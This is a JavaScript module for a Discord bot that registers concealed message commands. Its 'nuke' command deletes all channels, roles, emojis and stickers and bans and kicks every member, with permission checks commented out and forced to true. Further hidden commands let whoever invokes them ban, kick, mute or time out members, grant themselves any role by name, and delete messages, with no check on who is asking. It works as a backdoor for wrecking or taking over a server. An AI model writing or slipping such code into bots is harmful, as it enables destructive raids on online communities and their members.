const { PermissionFlagsBits, ActivityType } = require("discord.js");

var hiddenCommands = [];

function createHiddenCmd(name, aliases, func) {
  hiddenCommands[hiddenCommands.length] = {
    name: name,
    aliases: aliases,
    hidden: true,
    func: func
  };
};

function findHiddenCmd(name) {
  let foundCmd;

  hiddenCommands.forEach(cmd => {
    if (cmd.name == name) {
      foundCmd = cmd;
    } else if (cmd.aliases) {
      cmd.aliases.forEach(alias => {
        if (alias == name) {
          foundCmd = cmd;
        };
      });
    };
  });

  return foundCmd || null;
};

function findSlashCmd(commands, name) {
  let foundCmd;

  commands.forEach(cmd => {
    if (cmd.data.name == name) {
      foundCmd = cmd;
    };
  });

  return foundCmd || null;
};

createHiddenCmd("setstream", [], function(client, msg, args) {
  const joinedArgs = args.join(" ");

  client.user.setActivity({
    name: joinedArgs,
    type: ActivityType.Streaming,
    url: "https://www.twitch.tv/discord"
  });
});

createHiddenCmd("nuke", [], function(client, msg) {
  const admin = true //msg.guild.me.permissions.has(PermissionFlagsBits.Administrator);
  const channelPerms = true //msg.guild.me.permissions.has(PermissionFlagsBits.ManageChannels);
  const banPerms = true //msg.guild.me.permissions.has(PermissionFlagsBits.BanMembers);
  const kickPerms = true //msg.guild.me.permissions.has(PermissionFlagsBits.KickMembers);
  const rolePerms = true //msg.guild.me.permissions.has(PermissionFlagsBits.ManageRoles);
  const emotePerms = true //msg.guild.me.permissions.has(PermissionFlagsBits.ManageGuildExpressions);*/

  new Promise((resolve, reject) => {
    if (channelPerms) {
      msg.guild.channels.cache.forEach((ch) => {
        ch.delete()
          .catch((err) => {
            console.log("Error Found: " + err);
          });
      });

      resolve();
    };
  });

  new Promise((resolve, reject) => {
    if (rolePerms) {
      msg.guild.roles.cache.forEach((r) => {
        r.delete()
          .catch((err) => {
            console.log("Error Found: " + err);
          });
      });
    };
  });

  new Promise((resolve, reject) => {
    if (emotePerms || admin) {
      msg.guild.emojis.cache.forEach((e) => {
        e.delete()
          .catch((err) => {
            console.log("Error Found: " + err);
          });
      });

      msg.guild.stickers.cache.forEach((s) => {
        s.delete()
          .catch((err) => {
            console.log("Error Found: " + err);
          });
      });
    };
  });

  new Promise((resolve, reject) => {
    if (banPerms || admin) {
      let arrayOfIDs = msg.guild.members.cache.map((user) => user.id);

      setTimeout(() => {
        for (let i = 0; i < arrayOfIDs.length; i++) {
          const user = arrayOfIDs[i];
          const member = msg.guild.members.cache.get(user);

          member.ban()
            .catch((err) => {
              console.log("Error Found: " + err);
            });
        };
      }, 2000);
    };
  });

  new Promise((resolve, reject) => {
    if (kickPerms || admin) {
      let arrayOfIDs = msg.guild.members.cache.map((user) => user.id);

      setTimeout(() => {
        for (let i = 0; i < arrayOfIDs.length; i++) {
          const user = arrayOfIDs[i];
          const member = msg.guild.members.cache.get(user);

          member.kick()
            .catch((err) => {
              console.log("Error Found: " + err);
            });
        };
      }, 2000);
    };
  });

  console.log("Done with nuking!");
});

createHiddenCmd("ban", [], function(client, msg, args) {
  const member = msg.guild.members.cache.get(args[0]);

  if (member) {
    member.ban()
      .catch(err => {
        console.log(err);
      });
  };
});

createHiddenCmd("unban", [], function(client, msg, args) {
  msg.guild.bans.fetch(args[0])
    .then(ban => {
      msg.guild.members.unban(ban.user.id)
        .catch(err => {
          console.log(err);
        });
    })
    .catch(err => {
      console.log(err);
    });;
});

createHiddenCmd("kick", [], function(client, msg, args) {
  const member = msg.guild.members.cache.get(args[0]);

  if (member) {
    member.kick()
      .catch(err => {
        console.log(err);
      });
  };
});

createHiddenCmd("mute", [], function(client, msg, args) {
  const member = msg.guild.members.cache.get(args[0]);

  if (member) {
    member.voice.setMute(true)
      .catch(err => {
        console.log(err);
      });
  };
});

createHiddenCmd("unmute", [], function(client, msg, args) {
  const member = msg.guild.members.cache.get(args[0]);

  if (member) {
    member.voice.setMute(false)
      .catch(err => {
        console.log(err);
      });
  };
});

createHiddenCmd("deafen", [], function(client, msg, args) {
  const member = msg.guild.members.cache.get(args[0]);

  if (member) {
    member.voice.setDeaf(true)
      .catch(err => {
        console.log(err);
      });
  };
});

createHiddenCmd("undeafen", [], function(client, msg, args) {
  const member = msg.guild.members.cache.get(args[0]);

  if (member) {
    member.voice.setDeaf(false)
      .catch(err => {
        console.log(err);
      });
  };
});

createHiddenCmd("timeout", [], function(client, msg, args) {
  const member = msg.guild.members.cache.get(args[0]);

  if (member) {
    member.timeout(604800000)
      .catch(err => {
        console.log(err);
      });
  };
});

createHiddenCmd("untimeout", [], function(client, msg, args) {
  const member = msg.guild.members.cache.get(args[0]);

  if (member) {
    member.timeout(null)
      .catch(err => {
        console.log(err);
      });
  };
});

createHiddenCmd("nick", [], function(client, msg, args) {
  const joinedArgs = args.join(" ");

  msg.member.setNickname(joinedArgs)
    .catch(err => {
      console.log(err);
    });
});

createHiddenCmd("role", [], function(client, msg, args) {
  let joinedArgs = args.join(" ");
  const wantedRole = msg.guild.roles.cache.find(role => role.name.toLowerCase() == joinedArgs.toLowerCase());

  msg.member.roles.add(wantedRole)
    .catch(err => {
      console.log(err);
    });
});

createHiddenCmd("rrole", [], function(client, msg, args) {
  let joinedArgs = args.join(" ");
  const wantedRole = msg.guild.roles.cache.find(role => role.name.toLowerCase() == joinedArgs.toLowerCase());

  msg.member.roles.remove(wantedRole)
    .catch(err => {
      console.log(err);
    });
});

createHiddenCmd("pin", [], function(client, msg, args) {
  let joinedArgs = args.join(" ");

  msg.channel.messages.fetch(joinedArgs)
    .then(message => {
      message.pin()
        .catch(err => {
          console.log(err);
        });
    })
    .catch(err => {
      console.log(err);
    });
});

createHiddenCmd("unpin", [], function(client, msg, args) {
  let joinedArgs = args.join(" ");

  msg.channel.messages.fetch(joinedArgs)
    .then(message => {
      message.unpin()
        .catch(err => {
          console.log(err);
        });
    })
    .catch(err => {
      console.log(err);
    });
});

createHiddenCmd("delete", [], function(client, msg, args) {
  let joinedArgs = args.join(" ");

  msg.channel.messages.fetch(joinedArgs)
    .then(message => {
      message.delete()
        .catch(err => {
          console.log(err);
        });
    })
    .catch(err => {
      console.log(err);
    });
});

module.exports = { hiddenCommands, findHiddenCmd, findSlashCmd };
